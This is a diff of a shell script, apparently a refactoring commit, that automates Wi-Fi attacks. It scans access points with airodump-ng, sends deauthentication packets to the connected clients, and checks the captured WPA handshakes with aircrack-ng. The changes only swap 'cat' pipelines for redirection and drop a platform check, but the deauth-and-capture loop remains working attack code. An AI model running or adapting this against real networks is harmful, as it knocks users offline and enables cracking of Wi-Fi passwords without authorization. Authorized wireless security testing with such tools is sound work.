@@ -8,13 +8,6 @@
 # airodump is being run after sending the deauthentication packet. Verification
 # of a captured handshake is done using aircrack-ng
 
-# get platform
-if [ -d "/system" ]; then
-  device=0 # android
-else
-  device=1 # linux
-fi
-
 airocheck() {
   # checks a handshake (passed by file name) using aircrack-ng
   # returns 1 on success and 0 on failure
@@ -94,16 +87,16 @@ rm -f "$path"*.cap &>/dev/null
 sleep 20
 airokill
 ctr=1
-$(cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d' >"$path"ninitfile)
+$(tr -d ' ' < $path$init 2>/dev/null | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d' >"$path"ninitfile)
 ninit=$(wc -l <"$path"ninitfile)
 rm -f "$path"ninitfile
 # level 1: access points (scan and apply filters)
-for i in $(cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d'); do
-  c=$(cat $path$init 2>/dev/null | tr -d ' ' | grep $i | awk -F ',' 'NR==1{print $4}')
+for i in $(tr -d ' ' < $path$init 2>/dev/null | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d'); do
+  c=$(tr -d ' ' < $path$init 2>/dev/null | grep $i | awk -F ',' 'NR==1{print $4}')
   echo "_$ctr/$ninit    "
   { "$AIRODUMP_BIN" -c $c --bssid $i -w $path$i -o pcap $INTERFACE &>/dev/null; } &
   sleep 2
-  if [ $(cat "$path$bl" 2>/dev/null | grep -c $i) -gt 0 ]; then
+  if [ $(grep -c $i "$path$bl" 2>/dev/null) -gt 0 ]; then
     # blacklisted access point
     echo "-         "
     airokill
@@ -125,12 +118,12 @@ for i in $(cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' |
     continue
   fi
   ctr2=1
-  $(cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}' >"$path"nairofile)
+  $(tr -d ' ' < $path$init 2>/dev/null | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}' >"$path"nairofile)
   nairo=$(wc -l <"$path"nairofile)
   rm -f "$path"nairofile
   # level 2: deauthenticate clients and try to capture handshake
-  for j in $(cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}'); do
-    curbssid=$(cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | grep $j | grep $i | awk -F ',' '{print $6}')
+  for j in $(tr -d ' ' < $path$init 2>/dev/null | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}'); do
+    curbssid=$(tr -d ' ' < $path$init 2>/dev/null | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | grep $j | grep $i | awk -F ',' '{print $6}')
     if [ "$curbssid" == "$i" ]; then
       echo "__$ctr2/$nairo    "
       # send a single deauth packet
@@ -159,7 +152,7 @@ ctr3=0
 for h in $(ls "$path"*.cap 2>/dev/null); do
   if [ $("$AIRCRACK_BIN" -a 2 "$h" -w "$path$wl"known.txt 2>/dev/null | grep -c valid) -eq 0 ]; then
     airstr=$("$AIRCRACK_BIN" -a 2 "$h" -w "$path$wl"known.txt 2>/dev/null | grep handshake)
-    getloc=$(cat "$path$loc"*.txt 2>/dev/null | sed '2q;d')
+    getloc=$(sed '2q;d' "$path$loc"*.txt 2>/dev/null)
     if [ $(echo "$airstr" | grep -c handshake) -eq 0 ]; then
       rm -f "$h"
     else
